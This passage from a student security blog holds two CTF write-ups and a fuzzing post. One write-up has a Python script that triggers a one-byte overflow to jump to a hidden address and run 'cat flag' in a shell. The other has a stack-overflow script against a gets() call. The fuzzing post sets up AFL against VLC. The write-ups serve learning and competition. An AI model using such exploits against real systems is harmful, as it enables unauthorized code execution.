<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='PYTHON'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c">#kill ourselves 1 time to get to the mother dragon</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;1&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;1&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;1&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Fight the dragon</span>
</span><span class='line'>
</span><span class='line'><span class="c">#choose priest</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;1&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#shield twice then regnerate we need to do this 4 times to trigger the one byte overflow</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;3&quot;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;3&quot;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;2&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#jump to the address of the secret level</span>
</span><span class='line'><span class="n">address</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span><span class="mh">0x08048DBF</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">address</span>
</span><span class='line'>
</span><span class='line'><span class="c">#feed commands to the shell</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;cat flag&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, lets enjoy the spoils of victory by piping the script through ncat! What can I say, it used to be a dragon once but then it took a use after free to the knee.</p>

<p><img class="center" src="/images/dragon/winning.png"></p>
</div>
  
  


      <footer>
      
      - <a href="/blog/2015/10/12/how-to-kill-a-dragon/">How to Kill a Dragon</a>
      <time datetime="2015-10-12T16:08:17-04:00" pubdate><span class='month'>Oct</span> <span class='day'>12</span> <span class='year'>2015</span></time>
      
      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a></span>
      
      </footer>
    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/09/21/an-american-fuzzylop-environment/">An American Fuzzylop Environment</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-09-21T11:43:48-04:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


  <div class="entry-content"><p>In an effort to try and find some zero-days in VLC media player, I’ve been trying to set up a solid environment for fuzzing with American Fuzzy Lop. At the beginning of this project my hardware was limited to a DELL 740 with components that were slowly dying. Well it was between fuzzing on that and fuzzing on my laptop. After reading afl’s readme I reconsidered…</p>

<blockquote><p>“That said, especially when fuzzing on less suitable hardware (laptops, smartphones, etc), it&#8217;s not entirely impossible for something to blow up.”</p></blockquote>


<p>The original DELL 740 went through several different iterations of operating system installs. The first iteration was a Gentoo install. I was actually really happy with Gentoo but there were several reasons I decided to abandon it. The dependencies for the version of vlc I wanted to compile were not present on portage, the drivers for the mouse I was using seemed to be non-existent (or buried deep within the kernel config), and in general it was an absolute nightmare waiting for things to compile on the older hardware.</p>

<p>The second iteration of operating system installs was Ubuntu. I first tried loading up 14.04 from a usb. It immediately crashed into an initram file system. Le sigh. Time to try lubuntu! lubuntu worked at first but the entire operating system would just freeze up after about 12 hours of fuzzing. I also had issues where lubuntu would fall asleep despite disabling sleep from the xfce system preferences.</p>

<p>It was after a reboot from one of the frozen lubuntu sessions that I encountered hardware issues yay! The hard drive completely died on me.  It was time to find the largest amount of cpu cycles I could get for the absolute cheapest price possible. For this I turned to UF surplus where I was able to get two fairly decent computers for around 35$ That’s less money and way more power than a raspberry pi 2!</p>

<p>Introducing megaman and Kirby:</p>

<p><img class="center" src="/images/aflenv/computers.jpg" width="1632" height="918"></p>

<p>Megaman is a DELL 740 with a AMD 2.40 GHZ processor, 2.0 GB of ram and a 160GB hard drive. Kirby is a slightly more beefy machine with a 3.0 GHZ Core 2 Duo processor, 4GB of ram, and a 250GB hard drive. The computers did not come with an operating system installed on them and unfortunately I didn’t have access to a monitor. It was time to be resourceful. I decided to take out the hard drives and install debian on them using vmware and a SATA to usb cable.</p>

<p><img class="center" src="/images/aflenv/harddrive.jpg" width="1632" height="918"></p>

<p>The installation went perfectly! I ended up installing two important packages before placing the hard drives back in the computers, ssh-server and xvnc4server. I used a small dlink router I had lying around from previous reverse engineering projects so I could easily access both computers from an internal network.</p>

<p>To actually give these computers access to the outside internet, I set the gateway of these machine to be my laptop. I used iptables to forward the fuzzing box’s traffic through the laptops wifi interface. Yep. The room hosting Kirby and megaman did not have access to a convenient Ethernet outlet.</p>

<p><img class="center" src="/images/aflenv/vnc.png" width="597" height="468"></p>

<p>At this point everything was working! I was able to connect to the VNC servers which would drop me into an extremely minimal window manager called mwm. After experiencing hiccups with lubuntu I wanted to stick with something as stripped back as possible.</p>

<p>To make the process of fuzzing more convenient I placed the fuzzing job in a simple shell script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>kirby@kirby:~<span class="nv">$ </span>cat fuzz.sh
</span><span class='line'>/home/kirby/bin/afl/afl-1.86b/afl-fuzz -t2000 -m512 -i /home/kirby/Documents/samples -o /home/kirby/Documents/out /home/kirby/Documents/vlc/vlc-2.2.0~rc2/bin/vlc-static --play-and-exit  @@
</span></code></pre></td></tr></table></div></figure>


<p>One thing you quickly notice after using afl on graphical applications is that the gui application starts in the same xsession as the terminal you start afl in. The terminal you start afl in has lots of important information in it such as the number of crashes so far, the number of new paths found, and the numbers of executions. Viewing the stats quickly becomes an epileptic’s worst nightmare. The simplest solution I came up with was to redirect the standard output of afl into a tmux session. You can find the tmux sessions in /dev/pts</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>kirby@kirby:/dev/pts<span class="nv">$ </span>ls
</span><span class='line'><span class="m">0</span>  <span class="m">1</span>  <span class="m">3</span>  <span class="m">4</span>  <span class="m">5</span>  <span class="m">6</span>  <span class="m">7</span>  ptmx
</span></code></pre></td></tr></table></div></figure>


<p>Being able to access the afl stats via tmux is extremely convenient! The redirection was as simple as fuzz.sh > /dev/pts/7</p>

<p><img class="center" src="/images/aflenv/aflmuxed.png"></p>

<p>What was I fuzzing exactly? I decided that the first round of fuzzing would be on windows media files since vlc’s demuxer looked rather complicated.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>kirby@kirby:~/Documents/samples<span class="nv">$ </span>ls -lh
</span><span class='line'>total 52K
</span><span class='line'>-rw-r--r-- <span class="m">2</span> kirby kirby 7.4K Sep <span class="m">14</span> 15:38 out-0491d9bd474d63efa19faa327540384e.wma
</span><span class='line'>-rw-r--r-- <span class="m">2</span> kirby kirby  27K Sep <span class="m">14</span> 15:40 out-3cdcfdc516b49d6352daa8e28ebe1021.wma
</span><span class='line'>-rw-r--r-- <span class="m">2</span> kirby kirby 7.7K Sep <span class="m">14</span> 15:49 out-467b15c65920cb1ebec71fe1d9f0a419.wma
</span><span class='line'>-rw-r--r-- <span class="m">2</span> kirby kirby 6.9K Sep <span class="m">14</span> 15:50 out-65412c58f15d9ce300b965a4e96aad40.wma
</span></code></pre></td></tr></table></div></figure>


<p>I decided to start with four files that were as small as I could get them. Checkout the video below to see the fuzzing environment in action!</p>

<center>
<iframe width="560" height="315" src="https://www.youtube.com/embed/8ARE7sD5MGQ" frameborder="0" allowfullscreen></iframe>
</center>



</div>
  
  


      <footer>
      
      - <a href="/blog/2015/09/21/an-american-fuzzylop-environment/">An American Fuzzylop Environment</a>
      <time datetime="2015-09-21T11:43:48-04:00" pubdate><span class='month'>Sep</span> <span class='day'>21</span> <span class='year'>2015</span></time>
      
      </footer>
    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/09/08/mma-ctf-rock-paper-shellcode/">MMA CTF: Rock Paper SHELLCODE</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-09-08T14:32:30-04:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


  <div class="entry-content"><p>MMA CTF: Rock Paper SHELLCODE</p>

<p>I had a really awesome time this weekend working on MMA CTF with the guys at ufsit.org ! Although the CTF lasted 48 hours, I was only able to put in 8 hours or so worth of time due to exams. I pretty much only went after pwnables, but checkout <a href="http://andrewjkerr.com/blog/mma-ctf-writeup/">http://andrewjkerr.com/blog/mma-ctf-writeup/</a> for an awesome web write-up from our secretary.</p>

<p><img class="center" src="/images/rps/run-normal.png"></p>

<p>The first challenge I solved was a 50 point pwnable called rps. The point of this challenge was to try and win 50 games of rock paper scissors against a remote service. They provided us with the binary for reverse engineering but not the text file that contains the flag.</p>

<p>When you do the math it becomes very clear that brute forcing 50 games of rock paper scissors is not going to be feasible.  The probability of doing that successfully would be (1/3)<sup>50</sup>. Time to load the binary into IDA…</p>

<p><img class="center" src="/images/rps/vulnerability.png"></p>

<p>It was actually very easy to identify the vulnerability in this application. The program imports and makes a call to the vulnerable function gets. This results in an 80 byte stack based buffer overflow. The only part that gave me trouble was the actual exploitation.</p>

<p>My first approach was to try and overwrite the saved rip and just point it to the victory condition found in the text segment (picture below).</p>

<p><img class="center" src="/images/rps/victory.png"></p>

<p>This was pretty easy to test out with about 5 lines of python.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='PYTHON'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">rip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="mh">0x0000424242424242</span><span class="p">)</span>
</span><span class='line'><span class="n">rbp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">)</span>
</span><span class='line'><span class="n">junk</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">80</span>
</span><span class='line'><span class="k">print</span> <span class="n">junk</span><span class="o">+</span><span class="n">rbp</span><span class="o">+</span><span class="n">rip</span><span class="p">,</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/rps/overflow.png"></p>

<p>After resolving some issues with canonical addressing, I was able to get control of rip. Unfortunately the location I was pointing rip into was not getting me the code execution I wanted. I actually have to go back and figure out why that was happening still. I came up with a different solution to the problem before spending more time on my old solution.</p>

<p><img class="center" src="/images/rps/draw.png"></p>

<p>Instead of overflowing rip I figured out that the seed which generated the choice of RPS was stored on the stack above where the user had to enter their name. Perfect! By overwriting the four bytes of entropy from /dev/random with AAAA it was possible to get the same sequence of rock paper scissors over and over again. From there we just shoved the solution through ncat.</p>

<p><img class="center" src="/images/rps/pwned.png"></p>
</div>
  
  


      <footer>
      
      - <a href="/blog/2015/09/08/mma-ctf-rock-paper-shellcode/">MMA CTF: Rock Paper SHELLCODE</a>
      <time datetime="2015-09-08T14:32:30-04:00" pubdate><span class='month'>Sep</span> <span class='day'>08</span> <span class='year'>2015</span></time>
      
      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/sit/'>sit</a></span>
      
      </footer>
    </article>
  
  <div class="pagination">
    
    <a class="prev" href="2">&larr; Older</a>
    
    <a href="/archives">Blog Archives</a>
    
  </div><!-- /div.pagination -->
</div><!-- /div.blog-index -->

      </div><!-- /div#content -->
    </div><!-- /div#main -->
  </div><!-- /div.container -->
  <footer><div id="footer-widgets-wrapper">
  <div id="footer-first" class="footer-widget">
    <h3>About Me</h3>
    <p>Hacker, programmer, tinkerer want to do all the things.</p>
    <section class="about-me">
      
      <div>
        <ul>
          
            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
          
          
            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
          
            <li>Blog: <a href="http://quantumvm.github.io//github">http://quantumvm.github.io//github</a></li>
        </ul>
      </div>
    </section>
  </div><!-- /div#footer-second -->

  <div id="footer-second" class="footer-widget">
    <h3>Involvement</h3>
	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>

	Take a look:
	 
	<a href="http://www.ufsit.org">www.ufsit.org</a> 
	
  </div><!-- /div#footer-second -->

  <div id="footer-third" class="footer-widget">
    <h3>Academics</h3>
	<img src="/images/profile.jpg" height=122 width=140 />
  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
	<p>B.S. Expected May 2016</p>
  </div><!-- /div#footer-third -->
</div><!-- /div#footer-widgets-wrapper -->

<div id="credit" role="contentinfo">
  <p>
    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
  </p>
</div>

</footer>
  














</body>
</html>
